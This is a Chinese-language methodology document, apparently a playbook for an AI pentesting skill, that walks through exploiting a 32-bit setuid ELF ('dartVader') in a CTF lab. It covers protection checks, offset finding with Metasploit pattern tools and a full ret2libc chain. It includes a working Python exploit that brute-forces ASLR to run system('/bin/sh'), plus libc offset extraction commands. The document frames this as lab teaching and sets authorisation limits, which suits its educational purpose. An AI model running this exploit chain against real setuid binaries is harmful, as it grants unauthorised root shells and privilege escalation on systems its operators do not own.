# 二进制栈溢出基础方法论（checksec 防护判定 → offset → ret2libc 全链）

> 来源：用户博客「缓冲区溢出专区」(p074 中文) +「Analyzing Buffer Overflow」(p001 英文)——同主题中英双版，以更完整者为准，命令与 exp 逐字摘录；file 前置信号取自「图片/文件/上传/Nc」(p079)，取回靶机二进制的命令取自「传输文件」(p069)。
> 触发场景：靶场/CTF 二进制题目、nc 直连的可执行服务、需要本地分析 ELF 溢出点。
> 定位声明：**偏教学/靶场向**。真实渗透中二进制漏洞开发优先级低于配置错误与 Web 攻击面——先跑完 SKILL.md Phase 1-3 的 Web/配置面。现有 24 个 playbook 全 Web 向（rce-deserialization.md 是 Java/PHP 反序列化），本文为净新增、零重叠。
> 实测样本：32 位 x86 ELF `dartVader`（setuid / 动态链接 / not stripped），libc 为 `/lib/i386-linux-gnu/libc.so.6`。**只覆盖 NX 开 + PIE 关 + ASLR=2 的 32 位路径**，余见 §4.5。

流程：`file`/`ldd` 定位数与链接方式 → A*100 崩 → `dmesg` 见 `ip 41414141` 确认控 EIP → checksec 五项 + readelf/scanelf 交叉验证 → pattern 定 offset → NX 开转 ret2libc（readelf -s + strings -t x 取偏移）→ `randomize_va_space`=2 则固定基址循环爆破 → 分段验证。

## 1. 防护判定：checksec 五项 → 绕过方向 / 「路径不通」判据

来源：缓冲区溢出专区（命令与输出逐字）

```bash
sudo apt install gdb-peda
locate gdb-peda                 # → /usr/share/gdb-peda/peda.py
gdb dartVader
pwndbg> source /usr/share/gdb-peda/peda.py
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

> 原文实测走 gdb-peda 内置 `checksec`（判定当前加载的二进制）。独立 checksec 工具的 `--file=<bin>` 写法**未在原文出现**，按 SKILL.md 硬约束 1 不凭记忆补参数——要用先 `checksec --help` 核实。

| 字段 | 含义（摘原文） | 状态的利用含义 → 绕过方向 / 判据 |
|---|---|---|
| CANARY | 返回地址前的哨兵值：函数开始压随机值、返回前校验，被改则终止程序 | disabled → 可直接覆盖返回地址。**enabled → 素材无泄露手法 = 此题路径不通**，改找非连续写/信息泄露点 |
| FORTIFY | 检查危险函数，运行时检测到溢出即将发生则终止 | disabled → strcpy 类不安全函数可放心溢出；enabled → 换输入通道或找未加固函数 |
| NX(=DEP) | 把内存区域标记为数据或指令；开启后栈/堆数据不可执行，注入的 shellcode CPU 拒绝执行 | ENABLED → 不注 shellcode。原文「必须使用 ROP 等技术绕过」；本文实测走 ret2libc（同属不注入代码） |
| PIE | 配合 ASLR 每次加载到随机位置，无法预测函数/变量地址 | disabled → 加载地址固定、代码段地址可硬编码；enabled → 需先泄露代码段基址（素材未覆盖） |
| RELRO | 保护 GOT 不被改写。Partial：GOT 放 BSS 段前防全局变量溢出覆盖，但本身仍可写；Full：启动时解析全部符号并整表只读 | Partial → GOT 改写类思路理论可行（本样本未走）；Full → 该路径彻底关闭 |

不依赖 gdb 的交叉验证（来源：缓冲区溢出专区）：

```bash
readelf -W -l /bin/dartVader | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
scanelf -e dartVader
 TYPE   STK/REL/PTL FILE 
ET_EXEC RW- R-- RW- dartVader 
```

GNU_STACK 权限 `RW` 无 `X` = 栈不可执行（NX/DEP 生效）→ shellcode 注入路径当场否掉；scanelf 三列 STK/REL/PTL = `RW-`/`R--`/`RW-`，类型 `ET_EXEC`（非 PIE）与 checksec 的 PIE disabled 互证。

前置信号（来源：图片/文件/上传/Nc）：`file` 判类型——原文对同一样本的判读是 **32 位 ELF + 设了 setuid 位**（任意用户执行都以文件所有者权限运行 → 溢出成功即本机提权）**+ 动态链接 + not stripped**（符号表/函数名/调试信息保留，逆向与写 exp 都更容易）。位数决定地址宽度与调用约定，必须先定。

## 2. 漏洞确认与 offset 确定

### 2.1 手工崩一次（来源：缓冲区溢出专区）

```bash
/bin/dartVader                                   # 正常输出
/bin/dartVader -h
/bin/dartVader $(python3 -c 'print("A"*10)')      # 正常
/bin/dartVader $(python3 -c 'print("A"*100)')
Segmentation fault (core dumped)
```

A*10 正常、A*100 段错误 → 溢出存在，临界长度在 10~100 之间。段错误 = 访问非法内存（越界/空指针/受保护区）被 OS 中止；core dumped = 系统生成了记录崩溃时内存状态的核心转储。

### 2.2 dmesg 是「控住 EIP」的直接证据（来源：缓冲区溢出专区）

```bash
dmesg |tail
[ 6771.328578] dartVader[2743]: segfault at 41414141 ip 41414141 sp bf80b560 error 14
```

`41414141` 转 ASCII 正是 `AAAA`（我们的输入），且 `ip` 同值 → **指令指针已被输入数据接管**，不是随机崩溃；`sp`=0xbf80b560 记录崩溃时栈位置；`error 14` = 页面错误（访问不可执行内存区域）。纪律：ip 全是自填字符才算「能控」，只崩不算。

### 2.3 模式串生成与定位（来源：缓冲区溢出专区）

```bash
msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
./dartVader <上面那串>          # → zsh: segmentation fault  ./dartVader
dmesg | tail
[12358.851973] dartVader[103250]: segfault at 63413563 ip 0000000063413563 sp 00000000ff8cde70 error 14 likely on CPU 1 (core 1, socket 0)
[12358.851987] Code: Unable to access opcode bytes at 0x63413539.
msf-pattern_offset -l 100 -q 0x63413563
[*] Exact match at offset 76
```

两处 `-l` 必须一致；`-q` 直接喂 dmesg/gdb 里的 ip 值（原文速查节写不带前缀的 `-q 35724134`，实测节写带前缀的 `-q 0x63413563`）。速查节另有长缓冲用法 `msf-pattern_crate -l 600` / `msf-pattern_offset -l 600 -q 35724134`（原文 `crate` 为笔误，正确子命令是 create），以及 `msf-nasm_shell` 内输入 `jmp esp` 取跳板指令地址——NX 关闭时 shellcode 路径的配件。**本题 offset = 76。**

### 2.4 栈结构理解（来源：缓冲区溢出专区 disassemble main）

```
gdb-peda$ disassemble main
   0x08048450 <+3>:     and    esp,0xfffffff0
   0x08048453 <+6>:     sub    esp,0x50
[...]
   0x0804847c <+47>:    lea    eax,[esp+0x10]
   0x08048480 <+51>:    mov    DWORD PTR [esp],eax
   0x08048483 <+54>:    call   0x8048310 <strcpy@plt>
   0x08048488 <+59>:    leave
   0x08048489 <+60>:    ret
```

`sub esp,0x50` 开 0x50 字节栈空间，但前面 `and esp,0xfffffff0` 的 16 字节对齐会吃掉若干字节 → **别拿 sub 的立即数当 offset，一律以 pattern 实测为准**；`lea eax,[esp+0x10]` = 缓冲区起点在 esp+0x10；`call strcpy@plt` 无长度检查 = 溢出点；`leave`（相当于 mov esp,ebp 后 pop ebp）再 `ret` 从栈顶弹返回地址跳转。低→高布局：`[缓冲区 esp+0x10] … 对齐填充 … [保存的 ebp][返回地址]`，这正是 76 > 0x50 的原因。

最小 PoC（只证明能改返回地址，不追求执行）：76 字节填充 + 4 字节可辨识标记，dmesg 见 `ip 42424242` 一类自填字符即闭环。原文等价证据链 = §2.2（A*100 → ip 41414141）+ §2.3（pattern → ip 63413563 定位 76）。**先拿这个，再谈利用。**

## 3. 利用链选择决策表（checksec/系统状态 → 走哪条）

| 状态 | 走哪条 | 依据（来源：缓冲区溢出专区 / Analyzing Buffer Overflow） |
|---|---|---|
| NX disabled（GNU_STACK 带 X） | 注入 shellcode + 跳板（`msf-nasm_shell` → `jmp esp`） | 原文速查节保留该用法；本样本 NX ENABLED 故未走 |
| NX ENABLED | **ret2libc**（调 libc 已有函数，不注入代码）；ROP 为原文并列的绕过手段 | 「如果开启则必须使用 ROP 等技术绕过」+ 全文实测 ret2libc |
| PIE disabled | 程序内地址可硬编码（ret2text 类思路的前提） | `ET_EXEC` 与 checksec 互证 |
| PIE enabled | 需先泄露代码段基址——素材未覆盖（§4.5） | 原文 PIE 段 |
| ASLR = 0 / 1 | 一次 `ldd` 取基址直接用 | `randomize_va_space`：0=关闭、地址固定；1=部分随机化（堆栈随机，部分区域仍固定）；2=完全开启 |
| ASLR = 2 | 32 位熵低 → 固定一个观测过的基址 + 循环爆破（原文 1024 次内命中） | 英文版：on 32-bit systems, the randomization entropy isn't massive |
| CANARY enabled | **此题路径不通**（素材无泄露手法），换思路或换目标函数 | 原文只给「关闭则可能被直接覆盖返回地址」 |
| RELRO Partial / Full | Partial 下 GOT 改写理论可行（本样本未走）；Full 则该路径关闭 | 原文 RELRO 两模式说明 |

ret2libc 四条件（逐条摘原文）：① 存在可控返回地址的漏洞（如缓冲区溢出）；② 程序动态链接 libc；③ 能泄露或预测 libc 关键函数地址（对抗 ASLR），否则无法定位；④ NX/DEP 开启时 ret2libc 是不依赖注入代码实现执行的主要方式。条件②用 ldd 确认：

```bash
ldd /bin/dartVader
        linux-gate.so.1 =>  (0xb76e6000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb752a000)
        /lib/ld-linux.so.2 (0xb76e8000)
```

> 术语纪律：`ret2plt`、栈迁移（stack pivot）、`one_gadget`、ROPgadget 具体链在两份原文中**均未出现**，本文不凭记忆补写（§4.5）。

## 4. ret2libc 全链

### 4.1 libc 版本确定（题目给了 vs 没给）

- **题目提供 libc.so**：偏移直接对题目给的那份库取（§4.2 两条命令指向该文件），运行基址仍要在目标上取或猜。
- **未提供**：在靶机上对 `ldd` 输出的真实路径取偏移（本样本 `/lib/i386-linux-gnu/libc.so.6`）。**本地 kali 的 libc 与靶机不同版本时偏移不通用**，必须用靶机那份；取回本地分析：`scp -P 10110 -q erso@10.110.10.45:/bin/dartVader .`（来源：传输文件）。
- ASLR 特征识别：连续两次 `ldd` 基址不同即生效（原文两次分别 0xb7615000 与 0xb75ed000）。

### 4.2 偏移计算（来源：缓冲区溢出专区）

```bash
cat /proc/sys/kernel/randomize_va_space
2
echo 0 > /proc/sys/kernel/randomize_va_space
-bash: /proc/sys/kernel/randomize_va_space: Permission denied
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|exit)"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
strings -t x /lib/i386-linux-gnu/libc.so.6 | grep -E /bin/sh
 162d4c /bin/sh
```

三个偏移：system `0x40310`、exit `0x33260`、`/bin/sh` `0x162d4c`。坑：`grep -E "(system|exit)"` 完整输出有十余行同名噪声（`_exit@@GLIBC_2.0` 000b8634、`pthread_exit` 000fb610、`atexit@GLIBC_2.0` 00128ce0、`svcerr_systemerr` 0011b8a0 等）——认准符号名精确为 `system@@GLIBC_2.0` 与 `exit@@GLIBC_2.0` 的两行；`__libc_system` 与 `system` 同为 00040310（别名，可互证）。改 `randomize_va_space` 需 root，普通用户 Permission denied → **只能绕过不能关闭**。

### 4.3 exp 骨架（逐字，来源：缓冲区溢出专区 / Analyzing Buffer Overflow）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from struct import pack
from subprocess import call

offset = b"A" * 76
libc = 0xb75c9000
system = pack("<I", libc + 0x40310)
exit = pack("<I", libc + 0x33260)
sh = pack("<I",libc + 0x162d4c)

buffer = offset + system + exit + sh
app = b"/bin/dartVader"

for i in range(1024):
    print("Attemp %d" % i)
    ret = call([app,buffer])
    if ret == 0:
        print("[+] Success!!!")
        break
    else:
        print("[-] Failed")
```

四段结构（原文解释，中英双版一致）：① **offset** 76 字节填满缓冲区到返回地址；② **system** 覆盖返回地址，执行 `system("/bin/sh")`；③ **exit** 作 system 的返回地址——英文版逐字 `In x86 calling convention, the stack looks like [Function Address] [Return Address] [Argument 1]`，故 sh 在 `ESP+4` 被 system 读为参数，exit 防止 system 返回后跳到 sh 或随机地址，**没有 exit 会导致崩溃**；④ **sh** 提供 `/bin/sh` 地址即 system 的参数。

`pack("<I", ...)`：`<` 小端、`I` 4 字节无符号整数——把整数地址转成能直接写内存覆盖返回地址的字节序（32 位样本；64 位宽度不同，见 §4.5）。`subprocess.call` 起子进程、等结束、返回退出码赋给 ret：0 = 正常退出（利用成功，或至少经由 exit 干净退出），非 0 = 可能未成功。

### 4.4 ASLR 处理与爆破思路

- **32 位（本文路径）**：随机化熵不大 → 挑一个从 `ldd` 观测过的可能基址（原文用 `0xb75c9000`），循环重试直到随机化与硬编码地址对上；原文 1024 次内命中，成功证据 = `ret == 0` + 拿到 shell（原文配图 Pa1.png）。
- **不可爆破的情形**：64 位（熵高）、PIE 开启（代码段也随机）、服务只允许单次会话（nc 一连崩了就没了）→ 必须信息泄露拿基址，**素材未覆盖**，不在此凭记忆补链。
- 副作用：每轮让目标进程崩一次，1024 次起进程是持续负载（§6）。

### 4.5 素材未覆盖清单（禁止凭记忆补；需要时按硬约束 1 联网核实权威来源）

两份原文中不存在以下内容，本文一律不写命令或代码：**pwntools 骨架**（`ELF()`/`process()`/`remote()`/`flat()`/`flat64()`/p32/p64）、**cyclic 生成与查找**（原文等价物是 msf-pattern_create / msf-pattern_offset）、ret2text / ret2plt / 栈迁移 / one_gadget / ROP 具体链、badchars 检测与规避、64 位栈对齐（16 字节对齐导致的崩溃）、64 位参数寄存器顺序、格式化字符串泄露 libc、题目只给 libc 时的版本检索库流程。

## 5. 工具与调试纪律

- **gdb + 插件装配**（来源：缓冲区溢出专区）：`sudo apt install gdb-peda` → `locate gdb-peda` 找到 `/usr/share/gdb-peda/peda.py` → `gdb dartVader` → 在 pwndbg 提示符下 `source /usr/share/gdb-peda/peda.py` 切到 `gdb-peda$`。原文明确「以上内容如使用 pwngdb 原理相同」（英文版：The principles above apply similarly if using pwndbg）→ peda 与 pwndbg 的 checksec/disassemble 结论通用，别为工具差异重做分析。
- **pwndbg 侧原文可见三条**：载入提示 `pwndbg: loaded 201 pwndbg commands. Type pwndbg [filter] for a list.`；banner tip `Use patch <address> '<assembly>' to patch an address with given assembly code`；嫌噪声用 `set show-tips off` 关闭。
- **常用分析命令**：`checksec`（§1）、`disassemble main`（§2.4）；无 gdb 时用 `readelf -W -l | grep GNU_STACK` / `scanelf -e` / `ldd` 交叉验证。
- **exp 分段验证原则**（依原文证据链顺序提炼）：① 只发填充，确认崩溃与临界长度（A*10 vs A*100）；② dmesg/gdb 确认 ip 被自己的数据接管（41414141）；③ pattern 定 offset 并**单独验证一次「只改返回地址」**（§2.4 最小 PoC）；④ 最后才拼 system+exit+sh 完整链。跳步直接上完整链，崩了分不清是 offset 错、libc 偏移错还是基址没撞上。
- **证据留存**（对齐 SKILL.md Phase 5）：dmesg 原始行、checksec 输出、readelf/strings 命中行、exp 脚本原文、成功截图逐项落盘——报告要能让人不看过程复现。
- **环境一致性**：本地分析用从靶机取回的副本（§4.1），libc 偏移必须在靶机那份库上取；gdb 里跑通 ≠ 直接跑通，最终验证用原文的 `call([app,buffer])` 实跑。

## 6. 边界声明（红线）

- **适用范围**：仅限靶场 / CTF / 书面授权范围内的二进制。溢出利用属实际代码执行，受 SKILL.md **Phase 4 门控**——「默认禁止：RCE 落地、建立持久化、横向移动、数据批量导出」，进入的唯一门是 Phase 0 授权逐条确认「可执行代码 / 可提权 / 可横向」。
- **无授权时止步于路径存在证明**：崩溃现象 + dmesg 的 ip 接管证据 + checksec/readelf 防护判定本身就是 finding，报告写「存在栈溢出，可控制返回地址（ip=填充字符）；NX 开启故需 ret2libc 类路径；未实际获取 shell（按授权边界）」，**不要跑 §4.3 的 exp**。
- **setuid 样本双重门控**：§1 前置信号的 setuid 位意味着溢出成功即本机提权，除 Phase 4 外还受提权门控约束（见 `privesc-linux-windows.md` 枚举层/利用层双层结构）——靶场习惯不要带进生产。
- **爆破前先告知**：1024 次起进程会持续崩溃目标服务，即使已授权也要提前说明，只在靶机/隔离环境跑，不在共享或生产主机上跑。
- **反幻觉**：本文所有命令、输出与 exp 代码逐字摘自标注来源文章；素材未覆盖的术语与工具见 §4.5，落地前联网核实权威来源，禁止凭记忆改写或补全。
